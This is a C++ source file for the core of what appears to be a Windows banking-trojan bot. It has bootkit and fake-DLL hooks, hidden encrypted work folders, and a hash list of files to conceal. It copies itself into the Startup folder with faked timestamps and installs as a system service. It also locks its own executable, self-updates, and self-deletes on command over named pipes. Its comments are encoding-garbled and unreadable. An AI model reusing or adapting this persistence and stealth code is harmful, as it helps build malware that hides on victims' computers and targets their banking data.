//---------------------------------------------------------------------------
#include <shlobj.h>

#include "BotCore.h"
#include "BotUtils.h"
#include "HTTPConsts.h"
#include "BotDef.h"
#include "BotHosts.h"
#include "StrConsts.h"
#include "Pipes.h"
#include "BotService.h"
//#include "DbgRpt.h"


//---------------------------------------------------------------------------
#include "BotDebug.h"

namespace COREDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define COREDBG COREDEBUGSTRINGS::DBGOutMessage<>

//---------------------------------------------------------------------------


//���� ���������� bot.plug, �� ������� ��� �������� � ���������� ��������� � ����� main.cpp ��� �������
//��� ��������� �������� ����� �������� �� �����
#ifdef BOTPLUG
	extern bool FakeDllDelete();
	bool UpdateBotFakeDll( BYTE* data, int c_data );
	bool UpdateBotBootkit( BYTE* data, int c_data );
#endif




class TBotData : public TBotObject
{
public:
	TProcessType ProcessType;  // ��� ����������� ��������

	// ������ ��� ������ �������
	string                ServiceName;
	SERVICE_TABLE_ENTRYA  ServiceTable[1];
	SERVICE_STATUS        ServiceStatus;
	SERVICE_STATUS_HANDLE ServiceStatusHandle;
};



//---------------------------------------------------------------------------

TBotApplication* Bot = NULL;
TBotData* BotData = NULL;


//
// ��� ����. ��������������� ������� �� ���� ����� ��������
//
TBotType BotType = BotRing3;


//--------------------------------------------
// ������ ���� ������, ������� �����
// ������� ���
//--------------------------------------------
DWORD BOT_HIDDEN_FILES[MAX_HIDDEN_FILES + 1] = {0};


//---------------------------------------------------------------------------
#define MAX_BOT_WORK_FOLDER_LEN 15

// ������� ������� ����
char BOT_WORK_FOLDER_NAME[MAX_BOT_WORK_FOLDER_LEN + 1] = {0};

DWORD BotWorkPathHash = 0;


// ������������ ������ ������� ������������ �����
#define MAX_CRYPTED_EXE_NAME_SIZE 50


// ����������� ��� ������������ ����� ����
char CryptedBotExeName[MAX_CRYPTED_EXE_NAME_SIZE] = "\0";


DWORD BotExeNameHash        = 0; // ��� ����� ����
DWORD BotServiceExeNameHash = 0; // ��� ����� ������� ����

//��� ����, ���������������� � ������� BOT::Initialize(), ����� �������� ���� ����� ������� ������� 
//����� ������� SetBankingMode()
char BOT_UID[128];


//****************************************************************************
//                              TBotApplication
//****************************************************************************

TBotApplication::TBotApplication()
{
	// �������������� ���������� ������
	Bot = this;


	// �������������� ���������� ��������� ����
	FTerminated = false;

	// ���������� PID ��������
	FPID = GetUniquePID();

	// ���������� ��� �������� � ������� �������� ���
	TMemory Buf(MAX_PATH);
	pGetModuleFileNameA(NULL, Buf.Buf(), MAX_PATH);
	FApplicationName = Buf.AsStr();

	// ���������� ������� ����
	FWorkPath = MakeWorkPath(false);

	// �������� ������������� ����
	FUID = GenerateBotID2();
}
//-------------------------------------------------------------


TBotApplication::~TBotApplication()
{

}
//-------------------------------------------------------------

DWORD TBotApplication::PID()
{
	// ������� ���������� ������������� �������� � ������� �������� ���
	return FPID;
}
//-------------------------------------------------------------

string TBotApplication::UID()
{
	return FUID;
}
//-------------------------------------------------------------

bool TBotApplication::Terminated()
{
	// ������� ���������� ������, ���� ���� �������� �������
	// �� ����������� ������
    return FTerminated;
}

//-------------------------------------------------------------

string TBotApplication::ApplicationName()
{
	// ��� ���������� � ������� �������� ���
	return FApplicationName;
}
//-------------------------------------------------------------


string TBotApplication::WorkPath()
{
	// ���� � �������� �������� ����, ��������  � �������� ������������
	return FWorkPath;
}
//-------------------------------------------------------------

string TBotApplication::MakePath(const char* SubDirectory)
{
	// ������� �������� ���� � ��������� ��������������
	// �����:
	// ������� �� ������������ ��������� �������������.
	// ��� ����������� ������������, ��� ���������� ���������

	string Path = WorkPath();

	if (!STRA::IsEmpty(SubDirectory))
	{
		if (SubDirectory[0] == SlashChar)
			SubDirectory++;

		string Temp = SubDirectory;

		if (Temp[Temp.Length() - 1] == SlashChar)
			Temp[Temp.Length() - 1] = 0;

		PCHAR SD = UIDCrypt::CryptFileName(Temp.t_str(), false);

		Path += SD;
		Path += Slash;

		STR::Free(SD);

		if (!DirExists(Path.t_str()))
			pCreateDirectoryA(Path.t_str(), NULL);
    }
	return Path;
}

string TBotApplication::MakePath(const string &SubDirectory)
{
	return MakePath(SubDirectory.t_str());
}
//-------------------------------------------------------------

string TBotApplication::CreateFile(const char* SubDir, const char* FileName)
{
	string Name = MakeFileName(SubDir, FileName);
	File::WriteBufferA(Name.t_str(), NULL, 0);
	return Name;
}

string TBotApplication::CreateFile(const string &SubDir, const char* FileName)
{
	return CreateFile(SubDir.t_str(), FileName);
}


//-------------------------------------------------------------

string TBotApplication::MakeFileName(const char* SubDir, const char* FileName)
{
	// ������� �������� ��� ����� � ������� ����� ����
	string Name = MakePath(SubDir);

	// ������� ��� �����
	if (!STRA::IsEmpty(FileName))
	{
		PCHAR Tmp = UIDCrypt::CryptFileName(FileName, false);
		Name += Tmp;
		STR::Free(Tmp);
    }

	return Name;
}

string TBotApplication::MakeFileName(const string &SubDir, const char* FileName)
{
	return MakeFileName(SubDir.t_str(), FileName);
}
//-------------------------------------------------------------

bool TBotApplication::FileExists(const char* SubDir, const char* FileName)
{
	// ������� ��������� ������� ����� � ������� ����� ����
	string Name = MakeFileName(SubDir, FileName);
	return File::IsExists(Name.t_str());
}

bool TBotApplication::FileExists(const string &SubDir, const char* FileName)
{
	return FileExists(SubDir.t_str(), FileName);
}
//-------------------------------------------------------------

string TBotApplication::GrabberPath()
{
	// ���� � �������� �������� ������� ������
	if (FGrabberPath.IsEmpty())
		FGrabberPath = MakePath(GetStr(StrGrabberPath));
	return FGrabberPath;
}
//-------------------------------------------------------------

string TBotApplication::PrefixFileName()
{
	// ������� ���������� ��� ����� ��� �������� ��������
	if (FPerfixFileName.IsEmpty())
		FPerfixFileName = MakeFileName(NULL, GetStr(EStrPrefixFileName).t_str());

	return FPerfixFileName;
}
//----------------------------------------------------------------------------


PCHAR TBotApplication::GetWorkFolder()
{
	// ������� ���������� ������� ������� ���� (�������� ���)

	if (!STR::IsEmpty(BOT_WORK_FOLDER_NAME))
		return BOT_WORK_FOLDER_NAME;

	// ���������� ��� �� ������ ��������� ������������ ������ �� ����
	string WorkPath = GetStr(StrBotWorkPath);

	PCHAR Name = UIDCrypt::CryptFileName((PCHAR)WorkPath.t_str(), false);

	// �������� ���� � ���������� ������
	const char *Buf = (Name) ? Name : WorkPath.t_str();

	DWORD ToCopy = Min(MAX_BOT_WORK_FOLDER_LEN, STRA::Length(Buf));

	m_memcpy(BOT_WORK_FOLDER_NAME, Buf, ToCopy);
	BOT_WORK_FOLDER_NAME[ToCopy] = 0;

	STR::Free(Name);

	// ����������� ���
	BotWorkPathHash = STRA::Hash(BOT_WORK_FOLDER_NAME);
	// ��������� ����� � ������ ������� ������
	BOT::AddHiddenFile(BotWorkPathHash);

	return BOT_WORK_FOLDER_NAME;
}
//----------------------------------------------------------------------------
/*
string TBotApplication::MakeWorkPath(bool SystemPath)
{
	// ������� ���������� ������� ����
	string Result;

	TMemory Path(MAX_PATH);
	if (!pSHGetSpecialFolderPathA(NULL, Path.Buf(), CSIDL_APPDATA, TRUE))
		return Result;

	if (SystemPath)
	{
		// �������� ���� � ��������� �����
		PCHAR Tmp = STRA::Scan(Path.AsStr(), ':');
		if (Tmp == NULL) return Result;
		Tmp++;
		*Tmp = 0;
	}

	Result = Path.AsStr();
	Result += "\\";
	Result += GetWorkFolder();
	Result += "\\";

	return Result;
}
//----------------------------------------------------------------------------
*/

string TBotApplication::MakeWorkPath(bool SystemPath)
{
	// ������� ���������� ������� ����
	string Result;

	TMemory Path(MAX_PATH);
	if (!pExpandEnvironmentStringsA("%AllUsersProfile%\\", Path.Buf(), MAX_PATH))
		return Result;

	Result =  Path.AsStr();
	Result += GetWorkFolder();
	Result += "\\";

	if (!DirExists(Result.t_str()))
		pCreateDirectoryA(Result.t_str(), NULL);
	pSetFileAttributesA(Result.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);


	return Result;
}
//----------------------------------------------------------------------------


PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
{
	// ������� ���������� ������� ������� ����

	string Path = Bot->WorkPath();

	if (Path.IsEmpty()) return NULL;

	// ��������� ������������
	if (!STR::IsEmpty(SubDir))
	{
        PCHAR CryptDir = UIDCrypt::CryptFileName(SubDir, false);

		Path += CryptDir;

		STR::Free(CryptDir);

		if (!DirExists(Path.t_str()))
			pCreateDirectoryA(Path.t_str(), NULL);

    }

	PCHAR Result = STR::New(2, Path.t_str(), FileName);

	return  Result;
}
//----------------------------------------------------------------------------




//**************************************************************************
//  ���������� ������ ���� ����
//**************************************************************************
namespace BOT
{



	//--------------------------------------------------
	//  ExecuteDeleteBot - ������� ��������� ������� ��
	//				       �������� ����
	//--------------------------------------------------
	void WINAPI ExecuteDeleteBot(LPVOID, PPipeMessage, bool &Cancel)
	{
		COREDBG("CORE", "�������� ������� �� �������� ����");

		string FileName;

		switch (BotData->ProcessType)
		{

			case ProcessLoader:
			{
				// ��������� �������� �� �������� �������
				FileName = BOT::GetBotFullExeName();

				// ������� ������ � ����
                Unprotect();

                break;
            }
		}

		COREDBG("CORE", "������� ���� %s", FileName);
		DeleteBotFile(FileName.t_str());

		Cancel = true;
    }

	//������� ���� (����) ����
	void DeleteBotFile( const char* FileName )
	{
		// ������� ����
		pSetFileAttributesA(FileName, FILE_ATTRIBUTE_NORMAL );
		BOOL Deleted = (BOOL)pDeleteFileA(FileName);
		if (!Deleted)
		{
			// �� ������� �� ������ ������� ����.
			// ������� ���� ����� ������������
			Deleted = (BOOL)pMoveFileExA(FileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
        }
	}
    //----------------------------------------------------------------------



	//--------------------------------------------------
	//  GetProcessPipeName - ������� ���������� ���
	//  ���������� ����� ��������
	//--------------------------------------------------
	string GetProcessPipeName(TProcessType Process)
	{
		string Name;

		switch (Process) {
			case ProcessLoader: Name = GetStr(EStrPipeLoader); break;
		}

        return Name;
	}
	//----------------------------------------------------------------------

	//--------------------------------------------------
	//  CreateProcessPipe - ������� ������ ���������
	//                      ����� ��������
	//--------------------------------------------------
	void CreateProcessPipe(TProcessType Process)
	{
		string Name = GetProcessPipeName(Process);
		if (Name.IsEmpty()) return;

		PProcessPipe P = PIPE::CreateProcessPipe(Name, false);
		if (P)
		{
			// ����� �������� ������� ������, ��������� ����������� �������
			if (Process == ProcessLoader || Process == ProcessService)
			{
				// ������������ ������� �������� ����
                PIPE::RegisterMessageHandler(P, ExecuteDeleteBot, NULL, NULL, GetStr(EStrProcessCommandDeleteBot).Hash());
            }
		}

		PIPE::StartProcessPipe(P);
	}
	//----------------------------------------------------------------------


	//--------------------------------------------------
	//  ServiceControlHandler - ������� ����������
	//                          ��������
	//--------------------------------------------------
	void WINAPI ServiceControlHandler(DWORD Request)
	{
		if (Request == SERVICE_CONTROL_STOP || Request == SERVICE_CONTROL_SHUTDOWN)
		{
			COREDBG("BotService", "�������� ������� ��������� �������");
			BotData->ServiceStatus.dwWin32ExitCode = 0;
			BotData->ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
			pSetServiceStatus(BotData->ServiceStatusHandle, &BotData->ServiceStatus);
			return;
        }


		pSetServiceStatus (BotData->ServiceStatusHandle, &BotData->ServiceStatus);
	}

	//--------------------------------------------------
	//  ServiceMain - ������� ������� ������� ����
	//--------------------------------------------------
	void WINAPI ServiceMain(DWORD argc, char** argv)
	{
		// �������������� ������ �������
		COREDBG("BotService", "�������� �������� ������ �������");
		BotData->ServiceStatus.dwServiceType       = BOT_SERVICE_TYPE;
		BotData->ServiceStatus.dwCurrentState      = SERVICE_START_PENDING;
		BotData->ServiceStatus.dwControlsAccepted  = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
		BotData->ServiceStatus.dwWin32ExitCode     = 0;
		BotData->ServiceStatus.dwServiceSpecificExitCode = 0;
		BotData->ServiceStatus.dwCheckPoint        = 0;
		BotData->ServiceStatus.dwWaitHint          = 0;

        // ������������ ���������� ������ �������
		BotData->ServiceStatusHandle = (SERVICE_STATUS_HANDLE)pRegisterServiceCtrlHandlerA(BotData->ServiceName.t_str(), ServiceControlHandler);
		if (BotData->ServiceStatusHandle == (SERVICE_STATUS_HANDLE)0)
		{
			// �� ������� ���������������� ��������� ������ �������
			COREDBG("BotService", "������ ����������� ����������� ������ ���������� ��������");
			return;
		}

		BotData->ServiceStatus.dwCurrentState = SERVICE_RUNNING;
		pSetServiceStatus (BotData->ServiceStatusHandle, &BotData->ServiceStatus);

		// ��������� ����������� ���� �������� ���������� ������ �������
		while (BotData->ServiceStatus.dwCurrentState == SERVICE_RUNNING)
		{
			pSleep(1000);
		}
	}
	//----------------------------------------------------------------------



	//--------------------------------------------------
	//  CheckIsService - ������� ��������� �������� ��
	//                   ������� ��������
	//--------------------------------------------------
	bool CheckIsService()
	{

		DWORD Hash1 = Bot->ApplicationName().Hash(0, true);
		DWORD Hash2 = GetServiceFullExeName().Hash(0, true);
		return Hash1 == Hash2;
	}

}
//**************************************************************************









void BOT::Initialize(TProcessType ProcessType)
{
	// ������� �������������� ���������� ��������� ����

	// �������������� ���
	InitializeAPI();

	//������ ���������� ������� ����
	BotData = new TBotData();
    Bot     = new TBotApplication();


	// ������������� ���������� ������ ����
	// ����� ���������� ���� �������� �������� ��
	// �������� �� ������� ��������
	BotData->ProcessType = (CheckIsService()) ? ProcessService : ProcessType;

	// ������ ��� ������� �����
	GetWorkFolderHash();

	GenerateUid(BOT_UID);

	// �������� �������� ����� ��� ����������
	// �������� ������ � ������ ������, ��� ���� ��� ����������� �����������
	// ������ �� �������� ������������� ��������� VEH.
	//InitialializeGlogalExceptionLogger(TRUE);


	CreateProcessPipe(ProcessType);
}

void BOT::InitializeApi()
{
	// �������������� ���
	InitializeAPI();
}

//----------------------------------------------------------------------------
PCHAR BOT::GetWorkPath(PCHAR SubDir, PCHAR FileName)
{
	//  ������� ���������� ������� ���� ����
    return BOTDoGetWorkPath(false, SubDir, FileName);
}
//----------------------------------------------------------------------------

PCHAR BOT::GetWorkPathInSysDrive(PCHAR SubDir, PCHAR FileName)
{
	//  ������ ������� GetWorkPath.
	//  ������� �� ����� �� �� � ���, ��� �����
	//   �������� � ����� ���������� �����
    return BOTDoGetWorkPath(true, SubDir, FileName);
}
//----------------------------------------------------------------------------

DWORD BOT::GetWorkFolderHash()
{
	//  ������� ���������� ��� ����� ������� �����
	return BotWorkPathHash;
}
//----------------------------------------------------------------------------

PCHAR BOT::GetBotExeName()
{
	//  ������� ���������� ��� ����� ����

	// ��� ������������� ���������� ��� ����
	if (STR::IsEmpty(CryptedBotExeName))
	{
		PCHAR Name = UIDCrypt::CryptFileName(GetStr(EStrOriginalBotExeName).t_str(), false);

		STR::Copy(Name, CryptedBotExeName, 0, STRA::Length(Name) + 1);

		STR::Free(Name);

		// ����������� ��� �����
		BotExeNameHash = STRA::Hash(CryptedBotExeName);

		// ��������� ��� � ������ ���������� �����
		AddHiddenFile(BotExeNameHash);
	}


	return CryptedBotExeName;
}
//----------------------------------------------------------------------------

DWORD BOT::GetBotExeNameHash()
{
	//  ������� ���������� ��� ��� ����� ����
    GetBotExeName();
    return BotExeNameHash;
}
//----------------------------------------------------------------------------

string BOT::GetBotFullExeName()
{
	//  ������� ���������� ������ ��� ����� ����
	return GetSpecialFolderPathA(CSIDL_STARTUP, GetBotExeName());
}
//----------------------------------------------------------------------------

//----------------------------------------------------
//  GetServiceFullExeName - ������� ���������� ������
//						    ��� ����� ������� ����
//----------------------------------------------------
string BOT::GetServiceFullExeName()
{
	// ������ ��� ��� ����� �������
	string Path = GetSpecialFolderPathA(CSIDL_SYSTEM, GetStr(EStrBotServiceExePath).t_str());

	if (!DirExists(Path.t_str()))
		pCreateDirectoryA(Path.t_str(), NULL);

	Path += GetStr(EStrBotServiceExeName);

	return Path;
}
//----------------------------------------------------------------------------



HANDLE BotFileHandle = NULL;
HANDLE BotMapHandle = NULL;


void BOT::Protect(PCHAR FileName)
{
	// ������� �������� ��� ���� �� ��������
	string Name = FileName;

	if (Name.IsEmpty())
		Name = GetBotFullExeName();

	if (Name.IsEmpty())
    	return;

	// ��������� ����
	BotFileHandle = (HANDLE)pCreateFileA(Name.t_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );


	if (BotFileHandle != INVALID_HANDLE_VALUE)
	{
		BotMapHandle = (HANDLE)pCreateFileMappingA(Name.t_str(), NULL, PAGE_READONLY, 0, 0, NULL );
	}
}

//----------------------------------------------------------------------------

void BOT::Unprotect()
{
	// ������� ������� ������ � ��� ����� ����
	pCloseHandle(BotFileHandle);
	pCloseHandle(BotMapHandle);

	BotFileHandle = NULL;
	BotMapHandle = NULL;
}
//----------------------------------------------------------------------------


bool BOT::AddToAutoRun(PCHAR FileName)
{
	// ������� ��������� ���� � ������������

	if (!FileExistsA(FileName))
		return false;

	string BotFile = GetBotFullExeName();

	if (StrSame(FileName, BotFile.t_str(), false, 0))
		return 0;

    // ������� ��������� ��������
	pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_NORMAL);

	// �������� ����
	bool Result = (BOOL)pCopyFileA(FileName, BotFile.t_str(), TRUE) == TRUE;

	// ������������� ���� �����
	SetFakeFileDateTime(BotFile.t_str());

	pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );

	// ������� �������� ����
	if (Result)
		pDeleteFileA(FileName);

	return Result;
}


//----------------------------------------------------
// InstallService - ������� ����������� ��� ����
//                  ��� ������
// FileName - ��� ��� ����� ����
//----------------------------------------------------
bool BOT::InstallService(const char* FileName)
{
	if (!FileExistsA((PCHAR)FileName))
		return false;

    COREDBG("BotCore", "������������� ������ ����");
	// �������� ���� � ��������� ����������
	string FN = GetServiceFullExeName();
	if (FN.IsEmpty()) return false;

	COREDBG("BotCore", "������ EXE ���� %s", FN.t_str());
    bool Result = (BOOL)pCopyFileA(FileName, FN.t_str(), FALSE) != FALSE;
	if (Result)
	{
		pSetFileAttributesA(FN.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );

		// ���� ����������, ����������� ������
		TService Service;
		Service.Name        = GetStr(EStrServiceName);
		Service.DisplayName = Service.Name;

		COREDBG("BotCore", "������ ������ %s", Service.Name.t_str());

		Result = Service.Install(FN.t_str());
		if (Result)
			Result = Service.Start();
		if (Result)
			COREDBG("BotCore", "������ ������� ������ � �������");
		else
			COREDBG("BotCore", "������ �������� � ������� ������� %d", pGetLastError());

		if (!Result)
		{
			COREDBG("BotCore", "�� ������� ��������� ������. ������ %d", pGetLastError());
		}
	}
	return Result;
}

//----------------------------------------------------
// UninstallService - ������� �������������
//                    ������ ����
//----------------------------------------------------
bool BOT::UninstallService()
{
	COREDBG("BotCore", "������������� ������");

	TService Service;
	Service.Name = GetStr(EStrServiceName);

	bool Result = Service.Uninstall();
	if (Result)
	{
		// ������ ����
		string ExeName = GetServiceFullExeName();
		COREDBG("BotCore", "������ ��������������. ������� ��� %s", ExeName.t_str());
		DeleteBotFile(ExeName.t_str());
	}
	return Result;
}



//----------------------------------------------------
// ExecuteService - ������� ��������� ����������
//                  �������
//----------------------------------------------------
void BOT::ExecuteService()
{
	BotData->ServiceName = GetStr(EStrServiceName);

	COREDBG("BotService", "������� ������ ���� %s", BotData->ServiceName.t_str());

	BotData->ServiceTable[0].lpServiceName = BotData->ServiceName.t_str();
	BotData->ServiceTable[0].lpServiceProc = ServiceMain;

	pStartServiceCtrlDispatcherA(BotData->ServiceTable);
	COREDBG("BotService", "������ �������� ������");
    pExitProcess(0);
}


//----------------------------------------------------
// IsService - ������� ���������� ������ ����
//             ������� ������� �������� ��������
//----------------------------------------------------
bool BOT::IsService()
{
	return BotData->ProcessType == ProcessService;
}




//----------------------------------------------------
//  BotExeMD5 - ������� ���������� MD5 ��� ��� ����
//----------------------------------------------------
string BOT::BotExeMD5()
{
	string FileName = BOT::GetBotFullExeName();

	string Result = CalcFileMD5Hash2(FileName.t_str());

	if (Result.IsEmpty())
	{
		Result.SetLength(32);
		m_memset(Result.t_str(), '0', 32);
    }
	return Result;
}

//----------------------------------------------------
//  TryCreatBotInstance - ������� ���������� 
//  ����� ��������, ��������� �������� �������� ��������
//  ��� ���� ��������� ������� ������.
//----------------------------------------------------
HANDLE BOT::TryCreateBotInstance()
{
	return TryCreateSingleInstance(GetStr(StrBotGlobalMutexName).t_str());
}

//������� ������� ��� �������, ���� ���������� 0, �� ������ ��� ���-�� ��� ������ 
HANDLE BOT::CreateBootkitMutex()
{
	return TryCreateSingleInstance(GetStr(StrBootkitIsRunMutex).t_str());
}

//���������� true, ���� ������� ��� �� ��� �������
bool BOT::BootkitIsRun()
{
	HANDLE m = BOT::CreateBootkitMutex();
	if( m == 0 ) return true;
	pCloseHandle(m);
	return false;
}

//----------------------------------------------------
//  IsRunning - ������� ���������� ������ ���� �
//  ������� ��� ������� ��������� ����
//----------------------------------------------------
bool BOT::IsRunning()
{
	HANDLE H = TryCreateBotInstance();
	bool Result = (H == 0);
	if (H) pCloseHandle(H);
	return Result;
}

//----------------------------------------------------
//  SendProcessMessage - ������� ���������� ���������
//  ���������� ��������
//----------------------------------------------------
bool BOT::SendProcessMessage(TProcessType Process, const string &Message)
{
	return PIPE::SendMessage(GetProcessPipeName(Process), Message);
}


//----------------------------------------------------
//  Delete - ������� ������� ��� ����
//----------------------------------------------------
void BOT::Delete()
{
	bool deleted = false;
	switch( BOT::GetBotType() )
	{
#ifdef BOTPLUG
		case BotFakeDll:
			deleted = FakeDllDelete();
			break;
#endif
	}

	if( !deleted )
	{
		if (BotData->ProcessType == ProcessLoader || BotData->ProcessType == ProcessService)
		{
			bool C; // ��� ������������ ������
			ExecuteDeleteBot(NULL, NULL, C);
		}
		else
		{
			//  ����� ���������� �� ������� ��������,
			//  ���������� ������� �� ��������
			string Cmd = GetStr(EStrProcessCommandDeleteBot);

			SendProcessMessage(ProcessLoader,  Cmd);
			SendProcessMessage(ProcessService, Cmd);
		}
	}
}

void BOT::DeleteAutorunBot()
{
	DeleteBotFile(BOT::GetBotFullExeName().t_str());
}
//----------------------------------------------------------------------------

void BOT::SaveSettings(bool SavePrefix, bool SaveHosts, bool IgnoreIfExists)
{
	// ������� ��������� ������� ���������

	// ��������� �����
	if (SaveHosts)
	{
		PCHAR HostsName = Hosts::GetFileName();
		if (!IgnoreIfExists || !FileExistsA(HostsName))
			SaveHostsToFile(HostsName);
		STR::Free(HostsName);
    }

	// ��������� �������
	if (SavePrefix)
	{
		string PrefixFile = Bot->PrefixFileName();
		if (!IgnoreIfExists || !FileExistsA(PrefixFile.t_str()))
			SavePrefixToFile(PrefixFile.t_str());
    }
}
//----------------------------------------------------------------------------

void BOT::DeleteSettings()
{
	// ������� ������� ����� ���������� ���������
	// ������� �����
	PCHAR HostsName = Hosts::GetFileName();
	pDeleteFileA(HostsName);
	STR::Free(HostsName);

	// ������� ���� ��������
	pDeleteFileA(Bot->PrefixFileName().t_str());
}

//----------------------------------------------------------------------------


//----------------------------------------------------
// ������� ��������� ������� ���� �� ��������� ����
//----------------------------------------------------
void BOT::SavePrefixToTemporaryFile()
{
	string FileName = Bot->MakeFileName(NULL, GetStr(EStrTemporaryPrefixFileName).t_str());
	SavePrefixToFile(FileName.t_str());
}
//----------------------------------------------------------------------------

//----------------------------------------------------
// ������� ��������� ������� ���� �� ���������� �����
// ��������� ��� � ������� ���� � ������� ���������
//----------------------------------------------------
void BOT::SavePrefixFromTemporaryFile()
{
	string TempName   = Bot->MakeFileName(NULL, GetStr(EStrTemporaryPrefixFileName).t_str());
	if (File::IsExists(TempName.t_str()))
	{
		string PrefixFile = Bot->PrefixFileName();
		string Prefix = LoadPrefixFromFile(TempName.t_str());
		if (!Prefix.IsEmpty())
			SavePrefixToFile(PrefixFile.t_str());
		pDeleteFileA(TempName.t_str());
    }
}



//----------------------------------------------------
//  ������� ���������/��������� ���� ����
//----------------------------------------------------
void BOT::SetBotType(TBotType Type)
{
    BotType = Type;
}

TBotType BOT::GetBotType()
{
	return BotType;
}
//----------------------------------------------------------------------------

//----------------------------------------------------
//  MakeUpdate - ������� ��������� ����
//----------------------------------------------------
bool BOT::MakeUpdate(const char *FileName, bool ResetSettings)
{
	if (!File::IsExists((PCHAR)FileName)) return false;

    COREDBG("MakeUpdate", "������������� ����� ������ ����");

	string BotFile = GetBotFullExeName();

	if (BotFile.IsEmpty()) return false;

	// ��� ������������� ������ ���������� ���������
	if (ResetSettings)
		DeleteSettings();

	// ������������� ������
	bool ServiceInstalled = UninstallService();

    // ������� ������� ������ ����
	if (FileExistsA(BotFile.t_str()))
	{
		COREDBG("MakeUpdate", "������� ������ ����");
		Unprotect();
		pSetFileAttributesA( BotFile.t_str(), FILE_ATTRIBUTE_ARCHIVE );

		// ������� ������ ����
		while (1)
		{
			if (pDeleteFileA(BotFile.t_str())) break;
            pSleep(100);
        }
	}

    // ����������� ������
	if (ServiceInstalled)
		InstallService(FileName);

	// ���������� ����
	bool Result = pMoveFileExA(FileName, BotFile.t_str(), MOVEFILE_REPLACE_EXISTING ) != 0;
	pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );


	/* TODO :
		� ������ �����, ��� ���������� ����, �� ��������� ����� ���������.
		� ���������� ����������  ����������� �������� "��������" ������ ����
	*/

	BOT::Protect(BotFile.t_str());

//	RunFileA(BotPath);
//	pExitProcess(1);

	if (Result)
    	COREDBG("MakeUpdate", "����� ��� ������� ����������");

	return Result;
}

#ifdef BOTPLUG
// ������� ��������� ���� bot.plug
bool BOT::UpdateBotPlug(BYTE* data, int c_data)
{
	switch (GetBotType()) {
		case BotFakeDll: return UpdateBotFakeDll(data, c_data);
		case BotBootkit: return UpdateBotBootkit(data, c_data);
    default:
        return false;
	}
}
#endif


//----------------------------------------------------
//  ������� ��� ����������� �������� ��������� ������
//----------------------------------------------------

void BOT::AddHiddenFile(DWORD Hash)
{
	// ��������� ��� � ������ ���������� ������
	if (!Hash) return;

	for (int i = 0; i < MAX_HIDDEN_FILES; i++)
	{
		if (BOT_HIDDEN_FILES[i] == Hash) break;
		else
		if (BOT_HIDDEN_FILES[i] == 0)
		{
			BOT_HIDDEN_FILES[i] = Hash;
			BOT_HIDDEN_FILES[i + 1] = 0;
			break;
		}
	}
}

void BOT::AddHiddenFile(const char* FileName)
{
	AddHiddenFile(STRA::Hash(FileName));
}


bool BOT::IsHiddenFile(DWORD FileHash)
{
	// ������� ���������� ������ ���� ��������� ���� ���������� ��������
	for (int i = 0; i < MAX_HIDDEN_FILES, BOT_HIDDEN_FILES[i] != 0 ; i++)
	{
		if (BOT_HIDDEN_FILES[i] == FileHash)
			return true;
	}
	return false;
}


bool BOT::IsHiddenFile(const char* FileName)
{
	return IsHiddenFile(STRA::Hash(FileName));
}

//���������� true, ���� ������� �����������
bool BOT::FakeDllInstalled()
{
	return Bot->FileExists( 0, GetStr(EStrFakeDllFlag).t_str() );
}
